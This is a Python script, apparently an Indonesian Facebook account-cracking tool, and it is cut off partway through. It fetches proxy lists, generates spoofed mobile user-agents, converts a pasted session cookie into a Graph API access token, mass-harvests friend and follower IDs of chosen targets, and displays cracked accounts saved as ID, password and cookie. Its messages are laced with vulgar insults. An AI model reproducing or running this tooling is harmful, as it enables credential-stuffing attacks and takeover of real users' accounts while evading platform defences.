#-----------------[ IMPORT-MODULE ]-------------------
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
pretty.install()
CON=sol()
#------------------[ USER-AGENT ]-------------------#
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print('[[\x1b[1;92mÃ¢â‚¬Â¢\x1b[1;97m] [\x1b[1;96mAlvino_adijaya_xy')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uaku=f'Mozilla/5.0 (Linux; Android {a}; SAMSUNG SM-A305FN) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
	ugen2.append(uaku)

#------------[ UBAH UA DIH SINI KAWAN]---------------#
for t in range(10000):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.randrange(111111,210000)
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	adell1=f'Mozilla/5.0 (Linux; Android 7.1.2{a}; Xiaomi 10 Pro Build/MBFMIEK){b}. AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.117{c}.0.{d}.{e} Mobile Safari/537.36'
	adell2=f'Mozilla/5.0 (Linux; Android 11{a}; Infinix X6816C Build/RP1A.201005.001; wv){b}. AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/320.0.0.34.118;]'
	adell3=f'Mozilla/5.0 (Linux; Android 11{a}; Infinix X665 Build/RP1A.200720.011; wv){b}.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.58{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/406.0.0.26.90;]'
	adell4=f'Mozilla/5.0 (Linux; Android 10.0.1{a}; oppo6833 Build/RP1A.200720.011; wv){b}.016;  AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/111.0.5563.116{c}.0.{d}.{e} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/408.1.0.36.103;]'
	uaku2 = random.choice([adell1,adell2,adell3,adell4])
	ugen.append(uaku2)

for x in range(10):
	a='Mozilla/5.0 (SAMSUNG; SAMSUNG-GT-S'
	b=random.randrange(100, 9999)
	c=random.randrange(100, 9999)
	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	g=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
	h=random.randrange(1, 9)
	i='; U; Bada/1.2; en-us) AppleWebKit/533.1 (KHTML, like Gecko) Dolfin/'
	j=random.randrange(1, 9)
	k=random.randrange(1, 9)
	l='Mobile WVGA SMM-MMS/1.2.0 OPN-B'
	uak=f'{a}{b}/{c}{d}{e}{f}{g}{h}{i}{j}.{k} {l}'
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/EC-1709/a/blob/main/bbnew.txt').text
		ua=open('.bbnew.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.bbnew.txt','r').read().splitlines()
###----------[  ANIMASI ]----------###
def adell_ganteng(berlari):
        for bot in berlari + "\n":sys.stdout.write(bot);sys.stdout.flush();time.sleep(0.1) 
###----------[  ANIMASI - 2 ]----------###
def adell_ganteng(berlari):
        for bot in berlari + "\n":sys.stdout.write(bot);sys.stdout.flush();time.sleep(0.01) 
adell_ganteng(f'SELAMAT DATANG ABANGÂ²KAKAKÂ² SEMOGA ANDA PANJANG UMUR.') 
adell_ganteng(f'SEBELUM CRACK DIMULAI JANGAN LUPA BERDOA')
adell_ganteng(f'DIHARAPKAN JANGAN TERLALU SERING CRACK')
adell_ganteng(f'KARNA BISA MENYEBAB KAN IP ANDA KESPAM')
adell_ganteng(f'SEDANG LOGIN KEDALAM TOOLS HARAP TUNGGU....')
time.sleep(3)
#------------[ INDICATION ]---------------#
id,id2,loop,ok,cp,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,0,0,[],[],[],[],[],[],[],[]
cokbrut=[]
pwpluss,pwnya=[],[]
#------------[ WARNA-COLOR ]--------------#
P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m' 
O = '\x1b[1;96m'
N = '\x1b[0m'    
Z = "\033[1;30m"
sir = '\033[41m\x1b[1;97m'
x = '\33[m' # DEFAULT
m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
asu = random.choice([m,k,h,u,b])
#------------------[ MACHINE-SUPPORT ]---------------#
def alvino_xy(u):
        for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(0.005)
def clear():
	os.system('clear')
def back():
	login()
#------------------[ LOGO-LAKNAT ]-----------------#
def banner():
	clear()
	sol()
	ban=''''
â™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ª
    __  __       _                                         _                 _      _                                       â™ª
 |  \/  |     | |                                       | |               | |    | |.                                            â™ª
 | \  / |_   _| |__   __ _ _ __ ___  _ __ ___   __ _  __| |______ __ _  __| | ___| |.               â™ª
 | |\/| | | | | '_ \ / _` | '_ ` _ \| '_ ` _ \ / _` |/ _` |______/ _` |/ _` |/ _ \ |.                       â™ª
 | |  | | |_| | | | | (_| | | | | | | | | | | | (_| | (_| |     | (_| | (_| |  __/ |.                                   â™ª
 |_|  |_|\__,_|_| |_|\__,_|_| |_| |_|_| |_| |_|\__,_|\__,_|      \__,_|\__,_|\___|_|.                â™ª
â™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ª
      âˆ†HALO SELAMAT DATANGâˆ†
      âˆ†SEMOGA ANDA SEHAT AMINâˆ†
      âˆ†STATUS: PRIBADI(PRIVATE)
      âˆ†JANGAN LUPA BACA DOA SEBELUM CRACKâˆ†
      âˆ†ASSALAMULAIKUM WR WBâˆ†
      âˆ†BERSYUKUR APA YG ADAâˆ†
â™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ªâ™ª
         
                      '''
	cetak(nel(ban, style='green'))
#--------------------[ BAGIAN-MASUK ]--------------#
def login():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
			sy2 = json.loads(sy.text)['name']
			sy3 = json.loads(sy.text)['id']
			menu(sy2,sy3)
		except KeyError:
			login_lagi334()
		except requests.exceptions.ConnectionError:
			li = '# PROBLEM INTERNET CONNECTION, CHECK AND TRY AGAIN'
			lo = mark(li, style='red')
			sol().print(lo, style='cyan')
			exit()
	except IOError:
		login_lagi334()
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\tSARAN EXTENSION : [green]COOKIEDOUGH[white]'))
		ses = requests.Session()
		cok = input('\nMasukan Cookie : ')
		ses.headers.update(
			{
				'content-type': 'application/x-www-form-urlencoded',
			}
		)
		data = {
				'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038',
				'scope': ''
		}
		response = json.loads(ses.post('https://graph.facebook.com/v2.6/device/login/', data=data).text)
		code, user_code = response['code'], response['user_code']
		verification_url, status_url = ('https://m.facebook.com/device?user_code={}'.format(user_code)), ('https://graph.facebook.com/v2.6/device/login_status?method=post&code={}&access_token=1348564698517390%7C007c0a9101b9e1c8ffab727666805038&callback=LeetsharesCallback'.format(code))
		ses.headers.pop(
			'content-type'
		)
		ses.headers.update(
			{
				'sec-fetch-mode': 'navigate',
				'user-agent': 'Mozilla/5.0 (Linux; Android 9; RMX1941 Build/PPR1.180610.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.54 Mobile Safari/537.36',
				'sec-fetch-site': 'cross-site',
				'Host': 'm.facebook.com',
				'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
				'sec-fetch-dest': 'document',
			}
		)
		response2 = ses.get(verification_url, cookies = {'cookie': cok}).text
		if 'Bagaimana Anda ingin masuk ke Facebook?' in str(response2) or '/login/?next=' in str(response2):
			exit('\n[!] cookie invalid')
		else:
			action = (re.search('action="(.*?)">', str(response2))).group(1) if re.search('action="(.*?)">', str(response2)) else None.replace('amp;', '')
			fb_dtsg = (re.search('name="fb_dtsg" value="(.*?)"', str(response2))).group(1) if re.search('name="fb_dtsg" value="(.*?)"', str(response2)) else None
			jazoest = (re.search('name="jazoest" value="(\d+)"', str(response2))).group(1) if re.search('name="jazoest" value="(\d+)"', str(response2)) else None
			data = {
				'fb_dtsg': fb_dtsg,
				'jazoest': jazoest,
				'qr': 0,
				'user_code': user_code,
			}
			ses.headers.update(
				{
					'origin': 'https://m.facebook.com',
					'referer': verification_url,
					'content-type': 'application/x-www-form-urlencoded',
					'sec-fetch-site': 'same-origin',
				}
			)
			response3 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok})
			if 'https://m.facebook.com/dialog/oauth/?auth_type=rerequest&redirect_uri=' in str(response3.url):
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				response4 = ses.post(response3.url, data = data, cookies = {'cookie': cok}).text
				action = (re.search('action="(.*?)"', str(response4))).group(1) if re.search('action="(.*?)"', str(response4)) else None.replace('amp;', '')
				fb_dtsg = (re.search('name="fb_dtsg" value="(.*?)"', str(response4))).group(1) if re.search('name="fb_dtsg" value="(.*?)"', str(response4)) else None
				jazoest = (re.search('name="jazoest" value="(\d+)"', str(response4))).group(1) if re.search('name="jazoest" value="(\d+)"', str(response4)) else None
				scope = (re.search('name="scope" value="(.*?)"', str(response4))).group(1) if re.search('name="scope" value="(.*?)"', str(response4)) else None
				display = (re.search('name="display" value="(.*?)"', str(response4))).group(1) if re.search('name="display" value="(.*?)"', str(response4)) else None
				user_code = (re.search('name="user_code" value="(.*?)"', str(response4))).group(1) if re.search('name="user_code" value="(.*?)"', str(response4)) else None
				logger_id = (re.search('name="logger_id" value="(.*?)"', str(response4))).group(1) if re.search('name="logger_id" value="(.*?)"', str(response4)) else None
				auth_type = (re.search('name="auth_type" value="(.*?)"', str(response4))).group(1) if re.search('name="auth_type" value="(.*?)"', str(response4)) else None
				encrypted_post_body = (re.search('name="encrypted_post_body" value="(.*?)"', str(response4))).group(1) if re.search('name="encrypted_post_body" value="(.*?)"', str(response4)) else None
				return_format = (re.search('name="return_format\\[\\]" value="(.*?)"', str(response4))).group(1) if re.search('name="return_format\\[\\]" value="(.*?)"', str(response4)) else None
				ses.headers.update(
					{
						'origin': 'https://m.facebook.com',
						'referer': response3.url,
						'content-type': 'application/x-www-form-urlencoded',
					}
				)
				data = {
					'fb_dtsg': fb_dtsg,
					'jazoest': jazoest,
					'scope': scope,
					'display': display,
					'user_code': user_code,
					'logger_id': logger_id,
					'auth_type': auth_type,
					'encrypted_post_body': encrypted_post_body,
					'return_format[]': return_format,
				}
				response5 = ses.post('https://m.facebook.com{}'.format(action), data = data, cookies = {'cookie': cok}).text
				windows_referer = (re.search('window.location.href="(.*?)"', str(response5))).group(1) if re.search('window.location.href="(.*?)"', str(response5)) else None.replace('\\', '')
				ses.headers.pop(
					'content-type'
				)
				ses.headers.pop(
					'origin'
				)
				ses.headers.update(
					{
						'referer': 'https://m.facebook.com/',
					}
				)
				response6 = ses.get(windows_referer, cookies = {'cookie': cok}).text
				if 'Sukses!' in str(response6):
					ses.headers.update(
						{
							'sec-fetch-mode': 'no-cors',
							'referer': 'https://graph.facebook.com/',
							'Host': 'graph.facebook.com',
							'accept': '*/*',
							'sec-fetch-dest': 'script',
							'sec-fetch-site': 'cross-site',
						}
					)
					response7 = ses.get(status_url, cookies = {'cookie': cok}).text
					access_token = (re.search('"access_token": "(.*?)"', str(response7))).group(1) if re.search('"access_token": "(.*?)"', str(response7)) else None
					tokenw = open(".token.txt", "w").write(access_token)
					cokiew = open(".cok.txt", "w").write(cok)
					print('\nlogin berhasil jalankan lagi scnya')
				else:
					exit('\n[+] login gagal')
		
	except Exception as e:
		print('\n Ã¢â€¢Â°Ã¢â€â‚¬  Cookies Invalid Bro')
		os.system('rm -rf .cok.txt && rm -rf .token.txt')
		print(e)
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		print('[Ãƒâ€”] Cookies Kadaluarsa ')
		time.sleep(5)
		login_lagi334()
	os.system('clear')
	banner()
	ip = requests.get("https://api.ipify.org").text
	cetak(nel('\tSelamat Datang [green]%s[white] Ngentod'%(my_name)))
	adell_xd=(f'>> Your Idz : '+str(my_id))
	adell_xd=(f'>> Your Ip  : {ip}')
	print('')
	print('>> 1. Crack Publik ')
	print('>> 2. Crack Follower ')
	print('>> 3. Crack Grup   ')
	print('>> 4. Crack File	')
	print('>> 5. Hasil Crack  ')
	print('>> 0. Keluar       ')
	_____Adell__ganteng_____ = input('\n>> Pilih : ')
	if _____Adell__ganteng_____ in ['1']:
		dump_massal()
	elif _____Adell__ganteng_____ in ['2']:
		dump_follower()
	elif _____Adell__ganteng_____ in ['3']:
		error()
	elif _____Adell__ganteng_____ in ['4']:
		crack_file()
	elif _____Adell__ganteng_____ in ['5']:
		result()
	elif _____Adell__ganteng_____ in ['0']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print('>> Sukses Logout+Hapus Kukis ')
		exit()
	else:
		print('>> Pilih Yang Bener Asu ')
		back()
def error():
	print(f'{k}>> Maaf Fitur Ini Masih Di Perbaiki {x}')
	time.sleep(4)
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
	print('>> Hasil OK Anda ')
	print('>> Hasil CP Anda ')
	print('>> Kembali	')
	kz = input('\n>> Pilih : ')
	if kz in ['1','01']:
		try:vin = os.listdir('CP')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Memiliki Hasil CP ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['2','02']:
		try:vin = os.listdir('OK')
		except FileNotFoundError:
			print('>> File Tidak Di Temukan ')
			time.sleep(2)
			back()
		if len(vin)==0:
			print('>> Anda Tidak Mempunyai File OK ')
			time.sleep(2)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n>> Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print('>> Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print('>> File Tidak Di Temukan ')
				time.sleep(2)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['0','00']:
		back()
	else:
		print('>> Pilih Yang Bener Kontol ')
		exit()
#-------------------[ CRACK-PUBLIK ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input('>> Mau Berapa Target Njing ? : '))
	except ValueError:
		print('>> Masukkan Angka Anjing, Malah Huruff ')
		exit()
	if jum<1 or jum>100:
		print('>> Gagal Dump Idz ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input('>> Masukkan Idz Yang Ke '+str(yz)+' : ')
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print('>> Sinyal Loh Kek Kontoll ')
			exit()
	try:
		print('')
		print(f'>> Total Idz Yang TerkumpulÃ°Å¸â€Â¥{h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print('>> Sinyal Lo kek Kontol ')
		back()
	except (KeyError,IOError):
		print(f'>>{k} Pertemanan Tidak Public {x}')
		time.sleep(3)
		back()
#-------------------[ CRACK-PENGIKUT ]----------------#
def dump_pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	print('>> Ketik ( me ) Jika Ingin Crack Follower Sendiri ')
	pil = input('>> Masukkan Idz Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/'+pil+'?fields=subscribers.limit(99999)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print(f'>> Total Idz :{h} '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print('>> Koneksi Internet 
